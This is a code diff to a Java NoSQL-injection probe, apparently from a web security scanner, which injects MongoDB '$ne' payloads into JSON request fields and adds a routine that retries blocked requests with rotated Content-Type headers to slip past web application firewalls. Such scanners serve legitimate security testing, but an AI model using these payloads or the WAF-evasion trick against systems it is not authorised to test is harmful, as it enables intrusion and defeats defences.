@@ -129,7 +129,7 @@ public final class NoSqlProbe extends Probe {
                             "(\"" + Pattern.quote(key) + "\"\\s*:\\s*)(\"[^\"\\\\]*(?:\\\\.[^\"\\\\]*)*\"|null|true|false)",
                             "$1" + Matcher.quoteReplacement("{\"$ne\":null}"));
                     if (mutated.equals(body)) continue;
-                    if (hit(base, baseLen, baseStatus, send(req.withBody(mutated)), req.url(), key + " (JSON $ne)")) return true;
+                    if (hitWithCtSwap(req, mutated, base, baseLen, baseStatus, key + " (JSON $ne)")) return true;
                 }
                 Matcher nm = Pattern.compile("\"([^\"]+)\"\\s*:\\s*(-?\\d+)(?![.\\d])").matcher(body);
                 while (nm.find()) {
@@ -138,7 +138,7 @@ public final class NoSqlProbe extends Probe {
                             "(\"" + Pattern.quote(key) + "\"\\s*:\\s*)-?\\d+",
                             "$1" + Matcher.quoteReplacement("{\"$ne\":-1}"));
                     if (!mutated.equals(body)
-                            && hit(base, baseLen, baseStatus, send(req.withBody(mutated)), req.url(), key + " (JSON $ne num)")) return true;
+                            && hitWithCtSwap(req, mutated, base, baseLen, baseStatus, key + " (JSON $ne num)")) return true;
                 }
             }
 
@@ -377,6 +377,25 @@ public final class NoSqlProbe extends Probe {
         catch (Throwable t) { return null; }
     }
     private static String esc(String s) { return s == null ? "" : s.replace("\\", "\\\\").replace("\"", "\\\""); }
+
+    // When WAF-blocked on a JSON mutation, rotate Content-Type — some WAFs only inspect typed bodies.
+    private boolean hitWithCtSwap(HttpRequest req, String mutatedBody, HttpRequestResponse base,
+                                   int baseLen, int baseStatus, String point) {
+        HttpRequestResponse resp = send(req.withBody(mutatedBody));
+        if (hit(base, baseLen, baseStatus, resp, req.url(), point)) return true;
+        if (Evasion.enabled() && resp != null && resp.response() != null) {
+            int st = resp.response().statusCode();
+            if (st == 403 || st == 406 || st == 429) {
+                for (String ct : Evasion.contentTypeVariants()) {
+                    HttpRequestResponse rv = send(req.withBody(mutatedBody).withHeader("Content-Type", ct));
+                    if (rv != null && rv.response() != null && rv.response().statusCode() == 200)
+                        scanLog.debug("[WAF-evasion] nosql ct-swap bypassed (" + st + "→200) ct=" + ct + " point=" + point);
+                    if (hit(base, baseLen, baseStatus, rv, req.url(), point + " [WAF-evasion ct=" + ct + "]")) return true;
+                }
+            }
+        }
+        return false;
+    }
 
     private boolean hit(HttpRequestResponse base, int baseLen, int baseStatus,
                         HttpRequestResponse resp, String url, String point) {
